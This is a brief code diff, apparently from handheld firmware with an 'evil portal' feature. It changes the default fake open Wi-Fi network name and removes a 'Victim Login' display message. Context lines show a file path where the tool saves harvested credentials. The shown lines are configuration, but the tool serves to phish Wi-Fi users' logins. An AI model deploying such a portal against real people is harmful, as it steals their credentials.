@@ -3,7 +3,7 @@
 // Retaining the Portuguese translations since this project has a large
 // fan base in Brazil. Shouts to CyberJulio as well.
 
-#define DEFAULT_AP_SSID_NAME "Free WiFi"
+#define DEFAULT_AP_SSID_NAME "FK Free WiFi"
 #define SD_CREDS_PATH "/fuck-nemo-portal-creds.txt"
 
 
@@ -300,7 +300,6 @@ void setupWebServer() {
 #elif defined(CARDPUTER)
     //SPEAKER.tone(4000, 50);     //Silent mode, just in case
 #endif
-    DISP.print("Victim Login");
 #if defined(M5LED)
     blinkLed();
 #endif
